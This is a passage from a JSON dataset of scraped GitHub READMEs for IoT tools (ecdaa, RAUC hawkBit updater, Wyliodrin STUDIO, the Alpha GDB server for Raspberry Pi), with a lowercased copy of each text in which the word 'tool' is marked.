here.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000927, "year": null}, {"Unnamed: 0": 929, "autor": 929, "date": null, "content": "ecdaa\nA C implementation of elliptic-curve-based Direct Anonymous Attestation signatures, using the LRSW-DAA scheme.\nThe project provides all DAA functionality for Issuers, Members, and Verifiers. Pseudonym linking (\"basename signatures\") is optional, and secret-key revocation lists can be used.\nThe algorithm used is compatible with Version 1.1 Release Draft of the FIDO ECDAA specification. Further implementation details can be found in doc/IMPLEMENTATION.md.\nInstallation\nSee doc/BUILDING.md for more information on building from source.\nPackages are also available for the following distributions.\nDebian (Stretch, Buster) or Ubuntu (Bionic)\nDIST=$(lsb_release -cs)\n# Install the Xaptum APT repo GPG signing key\nsudo apt-get install dirmngr\napt-key adv --keyserver keyserver.ubuntu.com --recv-keys c615bfaa7fe1b4ca\n# Add the repository to your APT sources\necho \"deb https://xaptum.jfrog.io/artifactory/debian ${DIST} main\" | sudo tee /etc/apt/sources.list.d/xaptum.list\nsudo apt-get update\n# Install the CLI tool and shared library\nsudo apt-get install ecdaa\n# For developers, header files and shared libraries can also be installed\nsudo apt-get install libecdaa-dev\n# For using a TPM 2.0, install the ecdaa-tpm library (and, optionally, development package)\nsudo apt-get install libecdaa-tpm0\nsudo apt-get install libecdaa-tpm-dev\nHomebrew (MacOS)\n# Tap the Xaptum Homebrew repository.\nbrew tap xaptum/xaptum\n# Install the library.\nbrew install xaptum\nUsage\nInformation on using the library can be found in the doc/USAGE.md document.\nThe ecdaa command-line tool provides a simple, file-based interface for all DAA functionality. If building from source, it's available in the tool directory.\nA basic Join-Sign-Verify flow is shown below.\nCreate Group\n# Issuer creates a new keypair\necdaa issuer genkeys -p issuer_public.bin -s issuer_private.bin\n...Issuer distributes issuer_public.bin to any Verifiers...\n# Verifier extracts group public key from Issuer's public key\necdaa extractgpk -p issuer_public.bin -g group_public.bin\n...Verifier saves group_public.bin...\nJoin\n# Member creates a keypair\necdaa member genkeys -p member_public.bin -s member_private.bin\n...Member sends member_public.bin to Issuer...\n# Issuer creates a credential on that public key\necdaa issuer issuecredential -p member_public.bin -s issuer_private.bin -c member_credential.bin\n...Issuer sends member_credential.bin to Member...\n...Member saves the member_credential.bin and its member_private.bin...\nSign\n...Member creates a message to be signed in the file message.bin...\n# Member creates signature over the message\necdaa member sign -s member_private.bin -c member_credential.bin -m message.bin -g signature.bin\n...Member sends message.bin and signature.bin to Verifier...\nVerify\n# Verifier checks signature\necdaa verify -g group_public.bin -m message.bin -s signature.bin\nLicense\nCopyright 2017-2019 Xaptum, Inc.\nLicensed under the Apache License, Version 2.0 (the \"License\"); you may not use this work except in compliance with the License. You may obtain a copy of the License from the LICENSE.txt file or at\nhttp://www.apache.org/licenses/LICENSE-2.0\nUnless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.", "link": "https://github.com/xaptum/ecdaa", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "ecdaa\na c implementation of elliptic-curve-based direct anonymous attestation signatures, using the lrsw-daa scheme.\nthe project provides all daa functionality for issuers, members, and verifiers. pseudonym linking (\"basename signatures\") is optional, and secret-key revocation lists can be used.\nthe algorithm used is compatible with version 1.1 release draft of the fido ecdaa specification. further implementation details can be found in doc/implementation.md.\ninstallation\nsee doc/building.md for more information on building from source.\npackages are also available for the following distributions.\ndebian (stretch, buster) or ubuntu (bionic)\ndist=$(lsb_release -cs)\n# install the xaptum apt repo gpg signing key\nsudo apt-get install dirmngr\napt-key adv --keyserver keyserver.ubuntu.com --recv-keys c615bfaa7fe1b4ca\n# add the repository to your apt sources\necho \"deb https://xaptum.jfrog.io/artifactory/debian ${dist} main\" | sudo tee /etc/apt/sources.list.d/xaptum.list\nsudo apt-get update\n# install the cli -----> tool !!!  and shared library\nsudo apt-get install ecdaa\n# for developers, header files and shared libraries can also be installed\nsudo apt-get install libecdaa-dev\n# for using a tpm 2.0, install the ecdaa-tpm library (and, optionally, development package)\nsudo apt-get install libecdaa-tpm0\nsudo apt-get install libecdaa-tpm-dev\nhomebrew (macos)\n# tap the xaptum homebrew repository.\nbrew tap xaptum/xaptum\n# install the library.\nbrew install xaptum\nusage\ninformation on using the library can be found in the doc/usage.md document.\nthe ecdaa command-line tool provides a simple, file-based interface for all daa functionality. if building from source, it's available in the tool directory.\na basic join-sign-verify flow is shown below.\ncreate group\n# issuer creates a new keypair\necdaa issuer genkeys -p issuer_public.bin -s issuer_private.bin\n...issuer distributes issuer_public.bin to any verifiers...\n# verifier extracts group public key from issuer's public key\necdaa extractgpk -p issuer_public.bin -g group_public.bin\n...verifier saves group_public.bin...\njoin\n# member creates a keypair\necdaa member genkeys -p member_public.bin -s member_private.bin\n...member sends member_public.bin to issuer...\n# issuer creates a credential on that public key\necdaa issuer issuecredential -p member_public.bin -s issuer_private.bin -c member_credential.bin\n...issuer sends member_credential.bin to member...\n...member saves the member_credential.bin and its member_private.bin...\nsign\n...member creates a message to be signed in the file message.bin...\n# member creates signature over the message\necdaa member sign -s member_private.bin -c member_credential.bin -m message.bin -g signature.bin\n...member sends message.bin and signature.bin to verifier...\nverify\n# verifier checks signature\necdaa verify -g group_public.bin -m message.bin -s signature.bin\nlicense\ncopyright 2017-2019 xaptum, inc.\nlicensed under the apache license, version 2.0 (the \"license\"); you may not use this work except in compliance with the license. you may obtain a copy of the license from the license.txt file or at\nhttp://www.apache.org/licenses/license-2.0\nunless required by applicable law or agreed to in writing, software distributed under the license is distributed on an \"as is\" basis, without warranties or conditions of any kind, either express or implied. see the license for the specific language governing permissions and limitations under the license.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000929, "year": null}, {"Unnamed: 0": 950, "autor": 950, "date": null, "content": "RAUC hawkBit Updater\nThe RAUC hawkBit updater is a simple commandline tool / daemon written in C (glib). It is a port of the RAUC hawkBit Client written in Python. The daemon runs on your target and operates as an interface between the RAUC D-Bus API and the hawkBit DDI API.\nQuickstart\nThe RAUC hawkBit updater is primarily meant to be used as a daemon, but it also allows you to do a one shot instantly checking and install new software.\nTo quickly getting started with hawkBit server, follow this instruction.\nSetup target (device) configuration file:\n[client]\nhawkbit_server = 127.0.0.1:8080\nssl = false\nssl_verify = false\ntenant_id = DEFAULT\ntarget_name = test-target\nauth_token = bhVahL1Il1shie2aj2poojeChee6ahShu\n#gateway_token = bhVahL1Il1shie2aj2poojeChee6ahShu\nbundle_download_location = /tmp/bundle.raucb\nretry_wait = 60\nconnect_timeout = 20\ntimeout = 60\nlog_level = debug\npost_update_reboot = false\n[device]\nproduct = Terminator\nmodel = T-1000\nserialnumber = 8922673153\nhw_revision = 2\nkey1 = value\nkey2 = value\nAll key/values under [device] group are sent to hawkBit as data (attributes). The attributes in hawkBit can be used in target filters.\nFinally start the updater as daemon:\n./rauc-hawkbit-updater -c config.conf\nDebugging\nWhen setting the log level to 'debug' the RAUC hawkBit client will print JSON payload sent and received. This can be done by using option -d.\n./rauc-hawkbit-updater -d -c config.conf\nCompile\nmkdir build\ncd build\ncmake ..\nmake\ncd ..\nTest Suite\nPrepare test suite:\nvirtualenv -p python3 venv\nsource venv/bin/activate\npython -m pip install --upgrade pip\npip install -r test-requirements.txt\nRun hawkBit docker container:\ndocker pull hawkbit/hawkbit-update-server\ndocker run -d --name hawkbit -p 8080:8080 hawkbit/hawkbit-update-server\nRun test suite:\n./test/wait-for-hawkbit-online && dbus-run-session -- pytest -v\nPass -o log_cli=true to pytest in order to enable live logging for all test cases.\nUsage / options\n/usr/bin/rauc-hawkbit-updater --help\nUsage:\nrauc-hawkbit-updater [OPTION?]\nHelp Options:\n-h, --help Show help options\nApplication Options:\n-c, --config-file Configuration file\n-v, --version Version information\n-d, --debug Enable debug output\n-r, --run-once Check and install new software and exit\n-s, --output-systemd Enable output to systemd", "link": "https://github.com/rauc/rauc-hawkbit-updater", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "rauc hawkbit updater\nthe rauc hawkbit updater is a simple commandline -----> tool !!!  / daemon written in c (glib). it is a port of the rauc hawkbit client written in python. the daemon runs on your target and operates as an interface between the rauc d-bus api and the hawkbit ddi api.\nquickstart\nthe rauc hawkbit updater is primarily meant to be used as a daemon, but it also allows you to do a one shot instantly checking and install new software.\nto quickly getting started with hawkbit server, follow this instruction.\nsetup target (device) configuration file:\n[client]\nhawkbit_server = 127.0.0.1:8080\nssl = false\nssl_verify = false\ntenant_id = default\ntarget_name = test-target\nauth_token = bhvahl1il1shie2aj2poojechee6ahshu\n#gateway_token = bhvahl1il1shie2aj2poojechee6ahshu\nbundle_download_location = /tmp/bundle.raucb\nretry_wait = 60\nconnect_timeout = 20\ntimeout = 60\nlog_level = debug\npost_update_reboot = false\n[device]\nproduct = terminator\nmodel = t-1000\nserialnumber = 8922673153\nhw_revision = 2\nkey1 = value\nkey2 = value\nall key/values under [device] group are sent to hawkbit as data (attributes). the attributes in hawkbit can be used in target filters.\nfinally start the updater as daemon:\n./rauc-hawkbit-updater -c config.conf\ndebugging\nwhen setting the log level to 'debug' the rauc hawkbit client will print json payload sent and received. this can be done by using option -d.\n./rauc-hawkbit-updater -d -c config.conf\ncompile\nmkdir build\ncd build\ncmake ..\nmake\ncd ..\ntest suite\nprepare test suite:\nvirtualenv -p python3 venv\nsource venv/bin/activate\npython -m pip install --upgrade pip\npip install -r test-requirements.txt\nrun hawkbit docker container:\ndocker pull hawkbit/hawkbit-update-server\ndocker run -d --name hawkbit -p 8080:8080 hawkbit/hawkbit-update-server\nrun test suite:\n./test/wait-for-hawkbit-online && dbus-run-session -- pytest -v\npass -o log_cli=true to pytest in order to enable live logging for all test cases.\nusage / options\n/usr/bin/rauc-hawkbit-updater --help\nusage:\nrauc-hawkbit-updater [option?]\nhelp options:\n-h, --help show help options\napplication options:\n-c, --config-file configuration file\n-v, --version version information\n-d, --debug enable debug output\n-r, --run-once check and install new software and exit\n-s, --output-systemd enable output to systemd", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000950, "year": null}, {"Unnamed: 0": 958, "autor": 958, "date": null, "content": "Wyliodrin STUDIO\nWyliodrin STUDIO is an educational platform for IoT and Embedded Linux systems.\nConnect to devices using TCP/IP or serial port\nDevelop software and firmware for IoT in several programming languages\nShell access to the device\nImport and export Wyliodrin STUDIO projects\nVisual dashboard for displaying sensor data\nDisplay the hardware schematics\nManage packages for Python and Javascript\nTask manager for managing the device\nNetwork connection manager for the device (Ethernet and WiFi)\nInteractive electronics documentation (resistor color code)\nExample projects and firmware\nSupported devices:\nRaspberry Pi\nMicroPython\nPico PI iMX8M\nUDOO Neo\nBeagleBone Black\nSupported languages\nVisual Programming (translates to Python)\nJavascript\nPython\nShell Script (bash)\nInstall\nWindows\nIf there are any errors, run\nnpm install --global --production windows-build-tools\nFor bluetooth WinUSB driver with Zadig tool\nmacOS\nInstall Xcode\nBuild\nThis section is used for when you want to build application from the source code.\nDependencies\nNodeJS version 10 or higher.\nBuild Instructions\nThe application itself can run in 2 modes.\nElectron\nElectron is the preffered way of running the application. The resulting tool starts as a standalone application.\nnpm install\nnpx electron-rebuild\nnpm run electron\nTo start the application you can issue:\nnpm start\nWeb\nAnother way of running the application is leveragin your internet browser, Firefox is recommended. Following lines will build all the needed artifacts:\nnpm install\nnpm run browser\nThen to run the application enter the build folder and run\nnpm install\nnpm start\nContribute\nWe would love your help. Click here to find out how to contribute.\nAuthors\nWyliodrin STUDIO is a product of Wyliodrin in partnership with the Politehnica University of Bucharest\nAlexandru Radovici - Maintainer\nOvidiu Stoica - UX / UI\nIoana Culic - Development Manager\nMarius Aluculesei - Projects, Application\nLiviu-Nicolae Moraru - Embedded Software\nCosmin Daniel Radu - Embedded Software\nCalin Dumitru - Simulators\nDiana Ghindaoanu - Notebook, Dashboard, Documentation\nTeona Severin - Web File Systems, Hooks, Statistics\nAndrei-Paul Zamfir - MicroPython\nIulia Andreea Luta - Docker\nAlexandra-Gabriela State - Tutorials\nContributions\nAna Marinescu - Pin Layout\nAndrei Deatcu - Resistor Color Code, Schematics\nAlexandru Vochescu - Examples\nLuis Miguel Capacho Valbuena - Translations, WyApp Serial\nRoberta-Alexandra Craciun - Tutorials\nSerban Andrei - GitLab Download\nWyliodrin is a trademark of Wyliodrin SRL. All rights reserved.\nLicense\nApache 2.0", "link": "https://github.com/wyliodrinstudio/WyliodrinSTUDIO", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "wyliodrin studio\nwyliodrin studio is an educational platform for iot and embedded linux systems.\nconnect to devices using tcp/ip or serial port\ndevelop software and firmware for iot in several programming languages\nshell access to the device\nimport and export wyliodrin studio projects\nvisual dashboard for displaying sensor data\ndisplay the hardware schematics\nmanage packages for python and javascript\ntask manager for managing the device\nnetwork connection manager for the device (ethernet and wifi)\ninteractive electronics documentation (resistor color code)\nexample projects and firmware\nsupported devices:\nraspberry pi\nmicropython\npico pi imx8m\nudoo neo\nbeaglebone black\nsupported languages\nvisual programming (translates to python)\njavascript\npython\nshell script (bash)\ninstall\nwindows\nif there are any errors, run\nnpm install --global --production windows-build-tools\nfor bluetooth winusb driver with zadig -----> tool !!! \nmacos\ninstall xcode\nbuild\nthis section is used for when you want to build application from the source code.\ndependencies\nnodejs version 10 or higher.\nbuild instructions\nthe application itself can run in 2 modes.\nelectron\nelectron is the preffered way of running the application. the resulting tool starts as a standalone application.\nnpm install\nnpx electron-rebuild\nnpm run electron\nto start the application you can issue:\nnpm start\nweb\nanother way of running the application is leveragin your internet browser, firefox is recommended. following lines will build all the needed artifacts:\nnpm install\nnpm run browser\nthen to run the application enter the build folder and run\nnpm install\nnpm start\ncontribute\nwe would love your help. click here to find out how to contribute.\nauthors\nwyliodrin studio is a product of wyliodrin in partnership with the politehnica university of bucharest\nalexandru radovici - maintainer\novidiu stoica - ux / ui\nioana culic - development manager\nmarius aluculesei - projects, application\nliviu-nicolae moraru - embedded software\ncosmin daniel radu - embedded software\ncalin dumitru - simulators\ndiana ghindaoanu - notebook, dashboard, documentation\nteona severin - web file systems, hooks, statistics\nandrei-paul zamfir - micropython\niulia andreea luta - docker\nalexandra-gabriela state - tutorials\ncontributions\nana marinescu - pin layout\nandrei deatcu - resistor color code, schematics\nalexandru vochescu - examples\nluis miguel capacho valbuena - translations, wyapp serial\nroberta-alexandra craciun - tutorials\nserban andrei - gitlab download\nwyliodrin is a trademark of wyliodrin srl. all rights reserved.\nlicense\napache 2.0", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000958, "year": null}, {"Unnamed: 0": 963, "autor": 963, "date": null, "content": "Alpha\nGDB offers the best embedded software development experience by allowing you to remotely load, debug and test your programs and hardware/software interfaces. It feels like native programming thanks to a similar smooth \"Edit-Compile-Run\" cycle.\nAlpha is a system-level GDB server (aka \"gdbstub\" and \"gdb stubs\") allowing you to dynamically debug anything running in your hardware target, from bare metal software to OS-backed programs, including their threads, the underlying drivers, etc. All with a single GDB session and without any JTAG probe.\nThis repository contains the freemium distribution of Alpha for any version of the Raspberry Pi.\nTable of Contents\nUse Cases\nBare Metal Programming\nBenchmarking\nWriting drivers\nHigh performance\nLearning by doing\nOperating System Debugging\nMulti-core Debugging\nA convenient programming environment\nA bare metal C library\nList of delegated syscalls\nList of implemented syscalls\nA stack\nAn address space\nAn extended GDB server\nExiting GDB resets the SoC\nStopping the execution\nAlpha-specific commands\nInstallation\nAlpha\nWiring\nExamples\nHello World\nCompiling\nRunning\nRaytracer\nCompiling\nRunning\nSupport\nLicensing\nGenerated by gh-md-toc\nUse Cases\nBare Metal Programming\nBare metal programming is ideal for benchmarking, high-performance programs & low-level prototyping.\nAlpha provides a modern & convenient bare metal programming environment:\nA ready-to-use hardware state thanks to more advanced hardware initializations than what firmwares or bootloaders usually do, including the floating point unit, caches and a convenient address space. Note that only the 32-bit mode of the ARM architecture is supported and that other modes are part of our business-level plan. Please, contact us for more details.\nThe ability to run standard C programs bare metal. C library functions involving syscalls (malloc, printf, etc.) are delegated to GDB by Alpha.\nBenchmarking\nThe hardest part of benchmarking is understanding the results. And this is the main reason for running benchmarks bare metal:\nBeing alone running on the hardware to:\nAvoid interferences of concurrent or parallel programs.\nBe able to easily reach the best or worst cases.\nBeing at the closest possible level to the hardware/software interface to:\nUnderstand perfectly what the hardware is doing.\nGet rid of too high-level abstractions possibly hiding implementation details.\nWriting drivers\nThe Raspberry Pi has a nice set of I/O interfaces (SPI, I2C, GPIO, USB, etc.) which makes it a good candidate to write the low-level parts of your drivers.\nYou can easily write, debug and test your I/O peripheral driver just its hardware documentation and GDB. You can then integrate it in any OS driver API such as Linux, FreeRTOS, etc. Note that is a very good practice to be able to easily test a driver.\nSimply plug your I/O peripheral and get started:\nYou can start exploring the hardware/software interface through GDB memory read and write commands.\nFocus on what really matters thanks a ready-to-use execution environment incluing supervisor-level execution privileges.\nHigh performance\nThe highest levels of performance and responsiveness can be easily reached bare metal. Being alone on the machine, right above the hardware/software interface, allows to avoid time-consuming calls and to reach the fastest response times and throughputs.\nLearning by doing\nLearning embedded software usually comes at a price you can now avoid with this GDB-centric approach. No extra JTAG probe, no complex firmware & bootloader dependency and no complex tools. Here, it's a simple matter of powering on the Raspberry Pi and launching GDB to load a program and run/debug/test it using the same tools (GCC) and file formats (ELF) as usual native programming. GDB is the most famous debugging tool which is much more than a simple debugger.\nMoreover, Alpha can catch common programming errors such as memory access violations to stop the execution exactly where the mistake happened:\n(gdb) monitor gdb/catch\nRST : no : Reset Exception\nUND : no : Undefined Instruction Exception\nSWI : no : Software Interrupt Exception\nPABRT : no : Prefetch Abort Exception\nDABRT : no : Data Abort Exception\nIRQ : no : IRQ (interrupt) Exception\nFIQR : no : FIQ (fast interrupt) Exception\n(gdb) monitor gdb/catch DABRT yes\nDABRT : yes : Data Abort Exception\nSo have fun and enjoy exploring the GPU, enabling another core, communicating through USB, or whatever comes to your mind.\nOperating System Debugging\nOS-aware debugging is part of our business-level plan and is disabled in this version. Please, contact us for more details.\nMulti-core Debugging\nMulti-core debugging is part of our business-level plan and is disabled in this version. Please, contact us for more details.\nA convenient programming environment\nA bare metal C library\nRunning bare metal does not mean at all having to write everything from scratch and in assembly. This repository shows program examples written in C and involving calls to the C library, such as printf() and scanf().\nThe provided C library is the newlib (because it can be directly integrated into GCC), which relies on the POSIX syscalls. Some of them\nthe most useful ones when prototyping, benchmarking & testing - can be handled by GDB (see below), while others are implemented bare metal and others not at all.\nList of delegated syscalls\nSyscalls are delegated to GDB by Alpha through its remote protocol. Their number and their arguments are limited but it is enough to print convenience logs, write benchmark results into CSV files, etc.\nopen\nclose\nread\nwrite\nlseek\nrename\nunlink\nstat/fstat\ngettimeofday\nisatty\nsystem\nList of implemented syscalls\nSyscalls that are implemented and can be used bare metal:\nbrk: requires a global symbol _end as beginning of the free area. We provide it through our linker script sdk/link.ld as the end of the program.\nA stack\nThe stack address is configured in the linker script through the __stack symbol. Its maximum size is thus the configured address minus the next non-free memory region.\nAn address space\nAlpha maps a useful address space including the RAM and the memory-mapped I/Os:\nAn extended GDB server\nExiting GDB resets the SoC\nResetting the hardware is a good practice to avoid side-effects and make things repeatable. Correctly leaving GDB sends a kill command to the target, which is translated by Alpha into a SoC reset, so you don't have to bother turning it off and on again to restart from scratch.\nStopping the execution\nAsynchronously interrupt the Raspberry Pi while it is executing your program using the command interrupt or the SIGINT signal through the ctrlc keystroke.\nFor example:\n(gdb) continue\nContinuing.\n^C\nProgram received signal SIGSTOP, Stopped (signal).\n0x0000921c in __ieee754_sqrt ()\n(gdb) # The execution is stopped\n(gdb) continue &\nContinuing.\n(gdb) interrupt\nProgram received signal SIGSTOP, Stopped (signal).\n0x0000921c in __ieee754_sqrt ()\n(gdb) # The execution is stopped\nThis feature requires external interrupts which must be unmasked (enabled) to allow them. Here is an example using GDB's built-in scripting:\n(gdb) print /x $cpsr &= ~(1 << 7)\n$1 = 0x6000015f\nThe raytracer example below uses it to be able to interrupt endless loop and quit GDB.\nAlpha-specific commands\nAlpha provides extra GDB commands accessible through the monitor command:\n(gdb) monitor help\nhelp [COMMAND]\nPrint help of all or help of COMMAND in parameter\nversion\nPrint version of Alpha Target\nmr8 ADDRESS [COUNT]\nRead COUNT or 1 8bit word at ADDRESS\nmr16 ADDRESS [COUNT]\nRead COUNT or 1 16bit word at ADDRESS\nmr32 ADDRESS [COUNT]\nRead COUNT or 1 32bit word at ADDRESS\nmw8 ADDRESS VALUE\nWrite the 8bit word VALUE at ADDRESS\nmw16 ADDRESS VALUE\nWrite the 16bit word VALUE at ADDRESS\nmw32 ADDRESS VALUE\nWrite the 32bit word VALUE at ADDRESS\nfill32 ADDRESS COUNT VALUE\nFill at ADDRESS COUNT 32bit word with VALUE\ngdb/wcet [yes|no]\nPrint or set Alpha WCET mode\ngdb/catch\nPrint the list of exceptions that can be caught by Alpha\ngdb/catch EXCEPTION [yes|no]\nPrint or set/unset the catching of EXCEPTION\nInstallation\nAlpha\nInstalling Alpha into your Raspberry Pi is very easy. You simply need to copy boot/{Alpha.bin, config.txt} into the boot partition of your Raspberry Pi' SD card. Alpha is then started by the Raspberry Pi's bootloader from its SD card according to config.txt directives (load & start address).\nThe script scripts/install-rpi-boot.sh creates a new SD card from scratch by:\nDownloading the officially distributed firmware and bootloader into boot/.\nFormatting the SD card in FAT32 (without partitioning it).\nCopying every files in boot/ into the SD card.\n$ ./scripts/install-rpi-boot.sh /dev/<your SD card>\n[+] Downloading the Raspberry Pi's firmware version 1.20161215\n######################################################################## 100.0%\n######################################################################## 100.0%\n[+] Temporarily mounting `/dev/<your SD card>` into `/tmp/rpi-sdcard-mountpoint`\n[+] Installing the RPi firmware and the Alpha debugger\n'boot/bootcode.bin' -> '/tmp/rpi-sdcard-mountpoint/bootcode.bin'\n'boot/start.elf' -> '/tmp/rpi-sdcard-mountpoint/start.elf'\n'boot/Alpha.bin' -> '/tmp/rpi-sdcard-mountpoint/Alpha.bin'\n'boot/config.txt' -> '/tmp/rpi-sdcard-mountpoint/config.txt'\n[+] Checking the integrity\n/tmp/rpi-sdcard-mountpoint/bootcode.bin: OK\n/tmp/rpi-sdcard-mountpoint/start.elf: OK\n/tmp/rpi-sdcard-mountpoint/Alpha.bin: OK\n[+] Un-mounting `/tmp/rpi-sdcard-mountpoint`\n[+] Your SD card is ready!\n[+] You can now insert it into the RPi and use Alpha through the RPI's Mini-UART\nWiring\nUsing GDB in client/server mode requires a link between your workstation and your Raspberry Pi. For portability reasons, we chose the Raspberry Pi's Mini-UART. You can connect it to your workstation using a USB-UART TTL 3.3V (not 5V) converter.\nHere are some random converter references:\nAdafruit's TTL cable\nFTDI's TTL cable TTL-232R-3V3.\nOr do it yourself using a USB-UART TTL 3.3V converter, 3 jumper cables and 1 USB cable.\nExamples\nTwo bare metal programs are provided as examples: a hello world including bare metal calls to printf() and scanf(), and a raytracer using the GPU.\nNote that we use docker to produce our development environments and build a Debian image with the expected tools, including the GCC toolchain for the ARM architecture. The Makefile command make shell builds the docker image according to sdk/Dockerfile. It is up to you to use it or use instead your own setup (and you can find the list of required dependencies in the sdk/Dockerfile).\n$ make shell\ndocker build -f sdk/Dockerfile --build-arg uid=$(id -u) .\nSending build context to Docker daemon 3.843 MB\nStep 1 : FROM debian:stretch\n...\nSuccessfully built 730a81db9233\nuser@3979cd200f4b:/home/user/farjump/raspberry-pi$ # Let's get started\nGDB is then used to remotely load the program. The file run.gdb is a helper GDB script:\nConnecting to the target through the TTY interface of the TTL cable.\nLoading the ELF executable.\nStarting running the program until entering the main() function.\nYou need to replace the serial interface /dev/ttyUSB0 with yours (usually /dev/ttyUSB*, /dev/ttyACM*, /dev/cu.* ... according to your OS).\n$ arm-none-eabi-gdb -x run.gdb <your ELF program>\nHello World\nCompiling\n$ make hello.elf\narm-none-eabi-gcc -specs=sdk/Alpha.specs -mfloat-abi=hard -mfpu=vfp -march=armv6zk -mtune=arm1176jzf-s -g3 -ggdb -Wl,-Tsdk/link.ld -Lsdk -Wl,-umalloc -Wl,-Map,hello.map -o hello.elf src/hello-world/HelloWorld.c\nRunning\nuser@f76db25a61c1:/home/user/farjump/raspberry-pi$ arm-none-eabi-gdb -x run.gdb hello.elf\nReading symbols from hello.elf...done.\n0x07f10570 in ?? ()\nLoading section .entry, size 0x14f lma 0x8000\nLoading section .text, size 0x11ed4 lma 0x8150\nLoading section .init, size 0x18 lma 0x1a024\nLoading section .fini, size 0x18 lma 0x1a03c\nLoading section .rodata, size 0x50c lma 0x1a058\nLoading section .ARM.exidx, size 0x8 lma 0x1a564\nLoading section .eh_frame, size 0x4 lma 0x1a56c\nLoading section .init_array, size 0x8 lma 0x2a570\nLoading section .fini_array, size 0x4 lma 0x2a578\nLoading section .jcr, size 0x4 lma 0x2a57c\nLoading section .data, size 0x9ac lma 0x2a580\nStart address 0x820c, load size 77607\nTransfer rate: 10 KB/sec, 892 bytes/write.\nTemporary breakpoint 1 at 0x832c: file src/hello-world/HelloWorld.c, line 7.\nTemporary breakpoint 1, main () at src/hello-world/HelloWorld.c:7\n7 printf(\"Enter a string: \\e[?25h\");\n(gdb) # We have reached the main() function, have fun now ;)\n(gdb) continue\nContinuing.\nEnter a string: Farjumper\nRPi says \"Hello Farjumper!\"\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n_exit (rc=0) at SYSFILEIO/MAKEFILE/../SOURCE/SYSFILEIO_EXIT.c:11\n11 SYSFILEIO/MAKEFILE/../SOURCE/SYSFILEIO_EXIT.c: No such file or directory.\n(gdb) quit\nuser@f76db25a61c1:/home/user/farjump/raspberry-pi$ # The RPi resets.\nRaytracer\nCompiling\n$ make raytracer.elf\narm-none-eabi-gcc -specs=sdk/Alpha.specs -mfloat-abi=hard -mfpu=vfp -march=armv6zk -mtune=arm1176jzf-s -g3 -ggdb -Wl,-Tsdk/link.ld -Lsdk -Wl,-umalloc -Wl,-Map,raytracer.map -o raytracer.elf -Og src/raytracer/main.c src/raytracer/Raytracing.c src/raytracer/VC.c src/raytracer/VC_aligned_buffer.S -lm\nRunning\nIf you want to watch the video output, plug first a screen to your RPi's HDMI port ;)\nuser@f76db25a61c1:/home/user/farjump/raspberry-pi$ arm-none-eabi-gdb -x run.gdb raytracer.elf\nReading symbols from raytracer.elf...done.\n0x07f10570 in ?? ()\nLoading section .entry, size 0x14f lma 0x8000\nLoading section .text, size 0x1890 lma 0x8150\nLoading section .init, size 0x18 lma 0x99e0\nLoading section .fini, size 0x18 lma 0x99f8\nLoading section .rodata, size 0xc lma 0x9a10\nLoading section .ARM.exidx, size 0x8 lma 0x9a1c\nLoading section .eh_frame, size 0x4 lma 0x9a24\nLoading section .init_array, size 0x8 lma 0x19a28\nLoading section .fini_array, size 0x4 lma 0x19a30\nLoading section .jcr, size 0x4 lma 0x19a34\nLoading section .data, size 0x590 lma 0x19a38\nStart address 0x820c, load size 8135\nTransfer rate: 10 KB/sec, 451 bytes/write.\nTemporary breakpoint 1 at 0x8320: file src/raytracer/main.c, line 221.\nTemporary breakpoint 1, main () at src/raytracer/main.c:221\n221 {\n(gdb) # Enable external interrupts to be able to stop the execution later\n(gdb) print /x $cpsr &= ~(1 << 7)\n$1 = 0x6000015f\n(gdb) continue\nContinuing.\n^C\nProgram received signal SIGSTOP, Stopped (signal).\n0x0000921c in __ieee754_sqrt ()\n(gdb) quit\nuser@f76db25a61c1:/home/user/farjump/raspberry-pi$ # The RPi resets.\nSupport\nSupport is provided through this repository's issue board. Feel free to also contact us.\nLicensing\nSee LICENSE for the full license text.", "link": "https://github.com/farjump/raspberry-pi", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "alpha\ngdb offers the best embedded software development experience by allowing you to remotely load, debug and test your programs and hardware/software interfaces. it feels like native programming thanks to a similar smooth \"edit-compile-run\" cycle.\nalpha is a system-level gdb server (aka \"gdbstub\" and \"gdb stubs\") allowing you to dynamically debug anything running in your hardware target, from bare metal software to os-backed programs, including their threads, the underlying drivers, etc. all with a single gdb session and without any jtag probe.\nthis repository contains the freemium distribution of alpha for any version of the raspberry pi.\ntable of contents\nuse cases\nbare metal programming\nbenchmarking\nwriting drivers\nhigh performance\nlearning by doing\noperating system debugging\nmulti-core debugging\na convenient programming environment\na bare metal c library\nlist of delegated syscalls\nlist of implemented syscalls\na stack\nan address space\nan extended gdb server\nexiting gdb resets the soc\nstopping the execution\nalpha-specific commands\ninstallation\nalpha\nwiring\nexamples\nhello world\ncompiling\nrunning\nraytracer\ncompiling\nrunning\nsupport\nlicensing\ngenerated by gh-md-toc\nuse cases\nbare metal programming\nbare metal programming is ideal for benchmarking, high-performance programs & low-level prototyping.\nalpha provides a modern & convenient bare metal programming environment:\na ready-to-use hardware state thanks to more advanced hardware initializations than what firmwares or bootloaders usually do, including the floating point unit, caches and a convenient address space. note that only the 32-bit mode of the arm architecture is supported and that other modes are part of our business-level plan. please, contact us for more details.\nthe ability to run standard c programs bare metal. c library functions involving syscalls (malloc, printf, etc.) are delegated to gdb by alpha.\nbenchmarking\nthe hardest part of benchmarking is understanding the results. and this is the main reason for running benchmarks bare metal:\nbeing alone running on the hardware to:\navoid interferences of concurrent or parallel programs.\nbe able to easily reach the best or worst cases.\nbeing at the closest possible level to the hardware/software interface to:\nunderstand perfectly what the hardware is doing.\nget rid of too high-level abstractions possibly hiding implementation details.\nwriting 